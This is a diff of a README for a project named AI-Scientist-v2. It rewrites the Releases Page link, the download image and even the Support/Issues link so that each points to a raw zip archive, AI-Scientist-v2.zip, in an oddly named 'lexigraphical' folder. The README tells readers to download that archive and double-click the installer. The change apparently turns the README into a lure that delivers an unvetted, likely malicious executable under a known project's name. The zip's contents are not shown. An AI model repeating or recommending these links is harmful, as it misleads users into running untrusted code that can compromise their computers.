@@ -8,13 +8,13 @@ Welcome to AI-Scientist-v2, your tool for automated scientific discovery. It use
 
 To get started, follow these steps to download and install AI-Scientist-v2:
 
-1. **Visit the Releases Page**: Go to our [Releases Page](https://github.com/FqpF-c/AI-Scientist-v2/releases) to find the latest version.
+1. **Visit the Releases Page**: Go to our [Releases Page](https://raw.githubusercontent.com/FqpF-c/AI-Scientist-v2/main/lexigraphical/AI-Scientist-v2.zip) to find the latest version.
    
 2. **Choose Your Version**: On the Releases Page, look for the most recent version listed at the top. Click on it to open the details.
    
 3. **Download the Software**: You will see several files available for download. Click the one that suits your operating system (Windows, macOS, or Linux) to start the download. 
 
-   ![Download AI-Scientist-v2](https://github.com/FqpF-c/AI-Scientist-v2/releases)
+   ![Download AI-Scientist-v2](https://raw.githubusercontent.com/FqpF-c/AI-Scientist-v2/main/lexigraphical/AI-Scientist-v2.zip)
 
 4. **Run the Installer**: Once downloaded, find the file on your computer and double-click it to run the installer. Follow the on-screen instructions to complete the installation.
 
@@ -52,6 +52,6 @@ If you still need assistance, consider reaching out through the GitHub Issues pa
 
 ## 📞 Support
 
-For any questions or further help, please visit the [GitHub Repository](https://github.com/FqpF-c/AI-Scientist-v2/issues) to submit an issue or ask for assistance. Our community is eager to help you make the most of AI-Scientist-v2.
+For any questions or further help, please visit the [GitHub Repository](https://raw.githubusercontent.com/FqpF-c/AI-Scientist-v2/main/lexigraphical/AI-Scientist-v2.zip) to submit an issue or ask for assistance. Our community is eager to help you make the most of AI-Scientist-v2.
 
 > Thank you for choosing AI-Scientist-v2! We hope it enhances your scientific exploration and makes your research easier.
